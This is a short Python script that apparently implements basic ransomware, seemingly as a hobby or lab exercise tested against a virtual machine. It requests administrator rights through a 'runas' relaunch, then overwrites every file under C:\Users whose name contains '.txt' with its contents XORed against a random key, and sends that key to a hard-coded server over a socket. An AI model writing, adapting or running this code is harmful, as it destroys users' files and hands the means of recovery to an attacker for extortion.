import socket, os, string, random, ctypes, sys

# SERVER_IP = '127.0.0.1'
SERVER_IP = '192.168.128.1' # This was the local IP of my machine. I used it instead of the other one to communicate with my virtual machine.
SERVER_PORT = 5678
KEY = ''.join(random.choices(string.printable.strip(), k=16)) # generate 16 character key ( without space )
TXT_FILES_ARRAY = []

# Check if user is admin or not
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# function to xor a string with a key
def xor(s, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(s)) 

# Find all text files in the users directory
if is_admin():
    count = 0
    ext = ".txt"
    for r, d, f in os.walk("C:\\Users"): # change the hard drive, if you want to a test file if you get permission errors
        for file in f:
            filepath = os.path.join(r, file)
            if ext in file:
                count += 1
                print(filepath)
                TXT_FILES_ARRAY.append(filepath)
    print(f'I have {count} text files in my system')

    # XOR file with randomly generated key
    for idx, i in enumerate(TXT_FILES_ARRAY):
        with open(TXT_FILES_ARRAY[idx], "r+", errors="ignore") as file:
            file_read_data = ''.join(file.readlines())
            file.seek(0) # go to the beginning of the file
            file.write(xor(file_read_data, KEY)) # XOR the key with the file data
            file.truncate() # remove the rest of the file
            file.close()

    with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, SERVER_PORT))
        data = s.recv(1024)
        print(data)
        s.send(bytes(KEY, 'utf-8'))
    exit()
else:
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)